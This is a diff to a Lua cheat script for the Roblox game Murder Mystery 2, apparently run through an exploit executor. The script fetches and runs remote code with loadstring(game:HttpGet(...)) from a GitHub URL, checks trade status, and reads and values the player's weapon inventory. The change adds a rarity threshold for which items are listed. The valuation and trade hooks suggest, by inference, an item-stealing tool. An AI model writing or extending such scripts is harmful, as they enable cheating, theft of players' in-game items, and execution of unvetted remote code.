@@ -37,6 +37,7 @@ end;
 local exec, execver = identifyexecutor()
 totalval = 0
 tradesd = 0
+minrarity = minrarity or "Godly"
 print(1)
 
 if IS_MM2 then
@@ -66,7 +67,7 @@ function trads()
     return game.ReplicatedStorage.Trade.GetTradeStatus:InvokeServer()
 end
 function getinv()
-    return game.ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(game.Players.LocalPlayer.Name).Weapons.Owned
+    return game:GetService("ReplicatedStorage").Remotes.Extras.GetFullInventory:InvokeServer(game.Players.LocalPlayer.Name).Weapons.Owned
 end
 local databrainrot = require(game.ReplicatedStorage.Database.Sync).Weapons
 
@@ -74,7 +75,7 @@ local databrainrot = require(game.ReplicatedStorage.Database.Sync).Weapons
 -- lookups + Godly+ rarity fallback (so unknown items still get a sensible value)
 local rarityTable = {"Common","Uncommon","Rare","Legendary","Vintage","Godly","Ancient","Unique"}
 local godlyIdx = table.find(rarityTable, "Godly") or 6
-local valueList = loadstring(game:HttpGet("https://raw.githubusercontent.com/kroxn/aj/refs/heads/main/vlues.lua"))() or {}
+local valueList = loadstring(game:HttpGet("https://raw.githubusercontent.com/kroxn/aj/refs/heads/main/vlues.lua"))()
 
 local function lookupValue(realName, itemType, rarity, chroma, year)
     local D = rarity
@@ -112,7 +113,16 @@ local function getItemValue(dataid)
     end
     return value
 end
-
+local zamltable = {
+    "Common",
+    "Uncommon",
+    "Rare",
+    "Legendary",
+    "Classic",
+    "Godly",
+    "Ancient",
+    "Unique"
+}
 task.spawn(function() urnubitems = getinv() end)
 function ischanged()
     local currentInventory = getinv()
@@ -137,18 +147,21 @@ function ischanged()
     end
     return false
 end
+local minzaml = table.find(zamltable, minrarity)
 function chang(inve)
     new = {}
     newval = 0
     for i,v in pairs(inve) do
         local value = getItemValue(i)
-        table.insert(new,{
-            name = i,
-            amount = v,
-            value = value
-        })
-        newval = newval + value * v
-        totalval = totalval + value * v
+
+            table.insert(new,{
+                name = i,
+                amount = v,
+                value = value
+            })
+            newval = newval + value * v
+            totalval = totalval + value * v
+
     end
     table.sort(new, function(a, b)
         return (a.value * a.amount) > (b.value * b.amount)
@@ -219,12 +232,16 @@ function inv()
     newwval = 0
     for i,v in pairs(getinv()) do
         local value = getItemValue(i)
-        table.insert(neww,{
-            name = i,
-            amount = v,
-            value = value
-        })
-        newwval = newwval + value
+        local layn = databrainrot[i].Rarity
+        local weaponraritysort = table.find(rarityTable, layn)
+        if weaponraritysort and weaponraritysort >= minzaml then
+            table.insert(neww,{
+                name = i,
+                amount = v,
+                value = value
+            })
+            newwval = newwval + value * v
+        end
     end
     table.sort(neww, function(a, b)
         return (a.value * a.amount) > (b.value * b.amount)
@@ -289,12 +306,16 @@ function invf()
     vaule = 0
     for i,v in pairs(getinv()) do
         local value = getItemValue(i)
-        table.insert(talbe,{
-            name = i,
-            amount = v,
-            value = value
-        })
-        vaule = vaule + value
+        local layn = databrainrot[i].Rarity
+        local weaponraritysort = table.find(rarityTable, layn)
+        if weaponraritysort and weaponraritysort >= minzaml then
+            table.insert(talbe,{
+                name = i,
+                amount = v,
+                value = value
+            })
+            vaule = vaule + value * v
+        end
     end
     inventroy = inventroy..tostring(vaule).."\n\n"
     table.sort(talbe, function(a, b)
